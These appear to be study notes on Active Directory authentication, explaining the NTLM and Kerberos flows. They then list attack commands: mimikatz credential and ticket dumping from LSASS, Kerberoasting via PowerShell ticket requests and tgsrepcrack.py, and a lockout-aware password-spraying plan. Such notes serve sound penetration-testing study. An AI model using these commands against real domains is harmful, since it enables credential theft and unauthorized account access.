===================
NTLM authentication
===================
authenticates to a server by ip address instead of by hostname
if the user attempts to authenticate to a hostname that is not registered on the active directory (AD) integrated DNS server

steps

client			│ application server		│ domain controller(DC)
────────────────────────┼───────────────────────────────┼───────────────────────────────
1. calculate NTLM hash--->2. username			│
3. nonce(random value)<---				│
		      --->4. response(encrypted nonce)--->5.response, username, nonce
		      	│				│ 6. encrypt nonce with NTLM hash
		      	│				│   and compare to response
		      	│				│ 7. approve authentication
		      	
=======================
kerberos authentication
=======================
microsoft's primary authentication mechanism since windows server 2003
uses ticket system
authenticate to a service in AD(DC's key distribution center(KDC) service)

authentication
	1. authentication server request from client to KDC(DC)
		encrypted time stamp using a hash derived from the password of the user and the username

	2. authenticate from KDC
		look up the password hash associate with the specific user and attempts to decrypt the time stamp
		success : decryption process is successful & the time stamp is not duplicate
	
	3. authentication server reply from KDC to client
		session key
			encrypted using the user's password hash
			since kerberos is stateless
		ticket granting ticket(TGT)
			contains information regarding the user
				group memberships, the domain, a time stamp, ip address of the client and the session key
			encrypted by a secret key

service ticket granting
	1. ticket granting service(TGS) request from client to KDC
		current user & timestamp
			encrypted using the session key
		the service principal name(SPN) of that resource
		encrypted TGT

	2. verification
		SPN exists in the domain
		the TGT is decrypted using the secret key
		session key is extracted from the TGT
		decrypt the username & time stamp of the request using the extracted session key
			
	3. ticket granting server reply from KDC to client
		SPN
			encrypted using TGT's session key
		session key
			encrypted using TGT's session key
		service ticket
			encrypted using the password hash of the service account registered with the SPN in question
			username, group members, new session key

service authentication
	1. application request from client to application server
		username
		time stamp
			encrypted with the session key(service ticket's)

	2.authentication
		decrypts the service ticket using service account password hash
			extracts the suername and the session key
		decrypt the username from the application request
			using the extracted session key

	3. service authentication from application server to client
		inspects the supplied group memberships in the service ticket
		assigns appropriate permissions to the user

=======================================
cached credential storage and retrieval
=======================================
when user loged in, the credential must be stored somewhere
the cached credential is stored in local security authority subsystem service(LSASS)

mimikatz.exe(run with administrative user)
	get debug privilege
		# privilege::debug
		result : Privilege '20' OK
	dump the credentials of all logged-on users
		# sekurlsa::logonpasswords
	get tickets(TGT, TGS) of current user
		# sekurlsa::tickets
		using TGT, can request other TGS

=======================
service account attacks
=======================
request the service ticket
	load kerberos request security token class
		PS> Add-Type -AssemblyNames System.IdentityModel
	call kerberos requestor security token constructor
		PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/<SPN>'
	list cached tickets for the current user
		PS> klist

download the service tickets
	mimikatz.exe
		# kerberos::list /export

decrypt the ticket and crack the hash
	*not need to get administrative privilege for this attack
	kerberoasting
		decrypt with brute-forcing or guessing
		1. sent the hash to the attacker
		2. run the kerberoast
			python /usr/share/kerberoast/tgsrepcrack.py <wordlist> <hash file>

==============================
low and slow password guessing
==============================
brute-forcing method occurs lockout of the account & alert to the administrator

1. look at the domain's account policy
	PS> net accounts
		lockout threshold : after this, the login is locked out
		lockout observartion window : after this, we get free login attempt
2. make a plan
	try in a row = lockout threshold - 1
	do the tries after each lockout observation window time

3. make a script
	enumerate
		enumerateADpassword.ps1
	find users that are using specific password
		Spray-Passwords.ps1
		options
		-Pass <password> : single user test
		-Admin : test admin accounts
